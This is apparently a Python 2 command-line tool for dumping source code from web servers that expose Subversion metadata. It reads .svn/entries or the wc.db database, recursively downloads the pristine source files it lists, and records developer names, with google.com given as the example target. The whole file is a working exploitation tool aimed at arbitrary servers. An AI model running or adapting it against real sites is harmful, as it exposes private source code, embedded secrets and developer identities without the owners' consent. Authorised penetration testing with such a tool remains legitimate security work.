#!/usr/bin/env python2
# -*- coding: utf8 -*-

# Author: Nixawk

import requests
import logging
import urlparse
import codecs
import sqlite3
import argparse
import os

logging.basicConfig(level=logging.INFO, format="[+] %(message)s")

logger = logging.getLogger('svn_dump')


class svn(object):
    def __init__(self):
        """dump svn disclosure files with (.svn/entries) and (wc.db)
        """
        logger.debug("svn dump tool initializes")
        self.authors = []
        self.svnurls = []
        self.svndirs = []
        self.prevurl = ""
        self.svnhost = ""

    def request(self, url, timeout=8):
        """send http request
        """
        logger.debug("send svn http request")
        return requests.get(url,
                            verify=False,
                            allow_redirects=False,
                            timeout=timeout)

    def createdir(self, dir):
        """create direcroty if it does not exists
        """
        logger.debug("check directory if exists or not")
        if not os.path.exists(dir):
            os.makedirs(dir)

        return dir

    def savefile(self, filepath, data):
        """write data to local file
        """
        logger.debug("save file %s" % filepath)

        self.createdir(os.path.dirname(filepath))

        with codecs.open(filepath, 'w', 'utf-8') as f:
            f.write(data)

    def saveinfo(self, output='/tmp'):
        """save svn authors/entries
        """
        self.savefile("%s/%s/developer.txt" % (output, self.svnhost),
                      "\n".join(self.authors))
        self.savefile("%s/%s/svn_entries.txt" % (output, self.svnhost),
                      "\n".join(self.svnurls))

    def svn_host(self, url):
        """parse url to a host/domain
        """
        if not self.prevurl:
            self.prevurl = url
            self.svnhost = urlparse.urlparse(self.prevurl).netloc

        return self.svnhost, self.prevurl

    def svn_authors(self, author):
        """svn authors handler
        """
        logger.debug("svn authors handler")
        if author not in self.authors:
            logger.debug("Author: %s" % author)
            self.authors.append(author)

        return self.authors

    def svn_files(self, url, filename, output='/tmp'):
        """svn files handler
        """
        logger.debug("svn files handler")
        if filename:
            svn_url = "%s/.svn/text-base/%s.svn-base" % (url, filename)
            svn_path = "%s/%s" % (url, filename)

            if svn_url not in self.svnurls:
                # logger.info(svn_url)
                svn_data = self.request(svn_url).text
                svn_path = svn_path.replace(self.prevurl,
                                            "%s/%s" % (output, self.svnhost))
                svn_path = svn_path.replace(".svn-base", "")
                # download svn file
                self.savefile(svn_path, svn_data)
                self.svnurls.append(svn_url)

        return self.svnurls

    def svn_dirs(self, url, dirname):
        """svn dir handler
        """
        logger.debug("svn directory handler")
        if dirname:
            svn_dir = "%s/%s" % (url, dirname)

            if svn_dir not in self.svndirs:
                logger.info(svn_dir)
                self.svndirs.append(svn_dir)
                self.entries(svn_dir)

        return self.svndirs

    def entries(self, url, output='/tmp'):
        """dump .svn/rntries records
        """
        logger.debug("svn entries dump")
        resp = self.request("%s/.svn/entries" % url)
        prev_line = ""

        self.svn_host(url)

        if resp.status_code != 200:
            logger.info("(%s) - %s" % (resp.status_code, url))
        else:
            logger.info(url)

            for line in resp.text.splitlines():
                # svn - code developer
                if line == "has-props":
                    self.svn_authors(prev_line)

                # svn - source code file
                elif line == "file":
                    self.svn_files(url, prev_line, output)

                # svn - svn dir
                elif line == "dir":
                    self.svn_dirs(url, prev_line)

                prev_line = line

            # save svn developers / dirs information
            self.saveinfo(output)

        return self.authors, self.svnurls, self.svndirs

    def read_wcdb(self, dbfile):
        """read svn entries and authors from local wc.db
        """
        conn = sqlite3.connect(dbfile)
        c = conn.cursor()

        sql = ('select local_relpath, ".svn/pristine/"'
               ' || substr(checksum,7,2) || "/" || '
               'substr(checksum,7) || ".svn-base" '
               'as alpha from NODES where kind="file";')

        c.execute(sql)
        svn_entries = c.fetchall()

        # developer / authors
        sql = 'select distinct changed_author from nodes;'
        c.execute(sql)
        authors = [r[0] for r in c.fetchall()]

        c.close()

        return svn_entries, authors

    def wcdb_authors(self, authors):
        """handle authos in wc.db
        """
        for author in authors:
            if author[0] not in self.authors:
                self.authors.append(author[0])

        return self.authors

    def wcdb_entries(self, url, entries, output='/tmp'):
        """wc.db entries handler
        """
        logger.debug("get svn entries from wcdb")
        for local_relpath, alpha in entries:
            if local_relpath and alpha:
                svn_url = "%s/%s" % (url, alpha)
                svn_path = "%s/%s" % (url, local_relpath)

                if svn_url not in self.svnurls:
                    self.svnurls.append(svn_url)
                    svn_data = self.request(svn_url).text
                    svn_path = svn_path.replace(
                        self.prevurl, "%s/%s" % (output, self.svnhost))
                    svn_path = svn_path.replace(".svn-base", "")
                    self.savefile(svn_path, svn_data)
                    self.svnurls.append(svn_url)

        return self.svnurls

    def wcdb(self, url, output='/tmp'):
        """get svn entries from remote wc.db
        """
        logger.debug("svn entries dump")
        resp = self.request("%s/.svn/wc.db" % url)

        self.svn_host(url)

        if resp.status_code != 200:
            logger.info("(%s) - %s" % (resp.status_code, url))
        else:
            wcdb_data = self.request(url).content
            wcdb_path = url.replace(
                self.prevurl, "%s/%s/wc.db" % (output, self.svnhost))
            self.savefile(wcdb_path, wcdb_data)

            svn_entries, authors = self.read_wcdb(wcdb_path)

            self.wcdb_authors(authors)
            self.wcdb_entries(url, svn_entries)

        self.saveinfo(output)

        return self.authors, self.svnurls, self.svndirs


def console_ui(args):
    if not args.url:
        print "[-] Please a url for svn disclosure test / -h for more details"
        return

    hacksvn = svn()

    if args.entries:
        hacksvn.entries(args.url)

    if args.wcdb:
        hacksvn.wcdb(args.url)


def main():
    desc = "Description: \n\t%(prog)s - svn dump tools"
    usage = "\n\tpython %(prog)s -u http://www.google.com -e"

    parser = argparse.ArgumentParser(description=desc, usage=usage)
    parser.add_argument('-u', help='target url which disclouse svn entries',
                        metavar='url', dest='url', action='store')
    parser.add_argument('-e', help='get svn records from .svn/entries',
                        dest='entries', action='store_true')
    parser.add_argument('-w', help='get svn records from remote wc.db',
                        dest='wcdb', action='store_true')
    args = parser.parse_args()

    console_ui(args)


if __name__ == "__main__":
    main()
